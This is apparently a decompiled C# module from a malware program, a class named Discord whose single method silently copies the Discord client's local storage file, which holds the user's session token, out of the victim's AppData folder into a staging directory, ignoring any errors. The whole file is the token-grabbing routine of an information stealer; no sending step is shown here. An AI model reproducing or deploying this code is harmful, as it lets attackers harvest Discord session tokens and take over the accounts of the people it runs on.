using System;
using System.IO;

namespace Strange.Modules
{
	// Token: 0x0200000D RID: 13
	internal class Discord
	{
		// Token: 0x0600001B RID: 27 RVA: 0x00002714 File Offset: 0x00000914
		public static void GetDiscord(string path)
		{
			Directory.CreateDirectory(path + "\\Discord");
			try
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord\\Local Storage\\https_discordapp.com_0.localstorage", path + "\\Discord\\https_discordapp.com_0.localstorage", true);
			}
			catch
			{
			}
		}
	}
}
